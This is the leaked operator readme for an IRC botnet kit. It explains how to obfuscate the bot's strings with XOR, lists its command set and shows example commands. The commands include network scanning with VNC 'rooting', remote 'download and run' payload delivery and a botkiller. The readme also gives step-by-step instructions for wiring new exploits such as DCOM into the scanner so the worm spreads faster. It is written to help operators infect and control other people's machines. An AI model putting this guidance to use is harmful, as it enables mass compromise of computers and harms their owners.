w00ps i leaked this :( sorry :DDDDDDDD lolz
sorry for anyone that paid $$$ all i can say is make sure your using a SECURE FTP!
OR YOU BETTER CHECK ON YOUR FILE A LOT BECAUSE PEOPLE WILL REPLACE IT WITH THIERS :P
dun dun dun ..... pz




MIGHT WANNA EDIT THE VNCPS.cpp file and add or remove some passwords :D and what nots


.bk -s 60
.patch -s 
.setcftp IP PORT USER PASS FILE.EXE -s
.scan 64 1 y 2 2 201.x.x.x -s
.h download file 1
.h remove

1. Preparations before compiling
--------------------------------

You need to edit config.h. Where MD5 hashes are requerd, you need
to put in MD5 hash, else it won't work. Use MD5ChecksumTest.exe
to generate MD5 hash of certain string. When calling command that
is hashed (download & remove), always use h as char right after 
command prefix (eg. !h download... or .h download...). If you wish 
you can also change irc strings, bot version, autostart description, 
registry location, etc... How to change that, read section 2.


2. Using XOR encoder
--------------------

Open strings.h. You can see there strings being encoded with XORing
depending on char decode_key[], which is also in this file. Xor.exe
is a command line program that can out of one file generate strings.h
file, where encoded strings are then located. 

Check strings.cfg and strings.h for example and compare them.
*Note1: always save old strings.h before making new one
*Note2: xor.exe does not write Decode function into strings.h, so
i recommend you to generate new .h file called strings_temp.h for
example and then just copy out string chars into strings.h (dont forget
to copy char decode_key[] and BOOL decode_comp too.

If your bot isnt working anymore, after you change strings (either
doesnt connect to irc or doesnt run after reboot, you have fucked up
something with strings).


3. Bot commands
---------------

Standard non-protected commands (assuming prefix = !):
() == needed parameter, [] == optional parameter

!v			bot version
!d			disconnect
!r			reconnect to same server
!q 			reconnect to next server
!n [nick]		change nick [to nick]
!restart		restarts the bot (this is not reconnect)
!scanstop		stop scanning
!patch			patch win xp sp2 tcpip.sys (report to techchannel)
!total			total transfers via bots ftpd
!vnc			report own vnc server status (to techchannel)
!getcftp		get current cftp settings
!j (#chan)		join #chan
!p (#chan)		part #chan
!bk (x)			start botkiller, repeat every x minutes 
			(if x == off, bk is turned off)
!setcftp (host) (port) (user) (pass) (file)	change cftp settings

Scanning command:
!scan (threads) (rand/seq) (ip/b/y) (vnc mode) (transfer mode) [lanbots range]

threads = number of threads (recommended 64, not go over 96)
rand/seq = 1 means random, 0 means sequential scanning
ip/b/y = put in IP to start scan from or b for C&D IP range scanning (own)
	 or y for B random IP range scanning (own)
vnc mode = 0 - no vnc scan,
	   1 - with vnc scan,
	   2 - with vnc scan and rooting,
	   3 - vnc scan only
transfer mode = 0 - all bots use ftp
		1 - lan bots use cftp, wan bots use ftp
		2 - all use cftp
lanbots range = range (in form of 127.0.x.x) for lanbots to scan (so they dont
		scan lan ranges which are mostly empty)

Recomendations: I recommend you to use cftp for lan bots and reach much higher
spread rate (usually with other bots, lan bots are there just for jack). But be
careful, when using vnc rooting and cftp, location of your exe can be easily
obtained by masters of pcs you are rooting!

Protected commands (download):
!h <custom-check-config> (URL) [destination] (mode)

custom-check-config = your string for download, which you protected with md5
URL = url to download from (must start with http:// or ftp://)
destination = optional destination place to copy bot to, but dont need to be used
	      (then the bot downloads .exe into temp folder)
mode = 0 - just download
       1 - download and run
       2 - download, run and remove me

Protected commands (remove):
!h <custom-check-config>

custom-check-config = your string for removal, which you protected with md5

4. Adding exploits
------------------

Adding exploits to this bot is a bit more complicated. Each scanning thread is
designed to check for all ports which are needed for exploitation. Thats why
each scan is actually already mass scan for best spreading when using multiple
exploits. 

To add exploit, you need to put in new .cpp and .h files with containing
exploit. 

Then open include.h and add "#include "yourexploit.h"". 

Then it comes to editing scanner. Open scanner.cpp and find 
"DWORD WINAPI ScanThread(LPVOID param)".
There is variable "BOOL Port5900;". Add your own bool variable (eg. adding dcom, 
add: "Port135"), so it looks like: "BOOL Port5900, Port135;".

Right after "while (1) {", add "Port135 = FALSE;".

Locate "Port5900 = AdvPortOpen(Thread[scan.ThreadNum].Sock, CurrentIP, 5900);"
and add below: "Port135 = AdvPortOpen(Thread[scan.ThreadNum].Sock, CurrentIP, 135);"

Then just add:
"if (Port135)
	DCOMExploit(parameters);"

This requers some basic knowledge of C; i cant tell you for parameters as that
depends on what sploit you have, but its not hard if you try :)

Tip: There are some exploits that run on same ports (ASN & netapi); usual bot
would double check same port, which is kinda stupid. This method checks port only
once, and then depending on open ports run exploit. If you have more exploits
running on same port, this bot can quite speed up spreading even with using
same amount of threads!
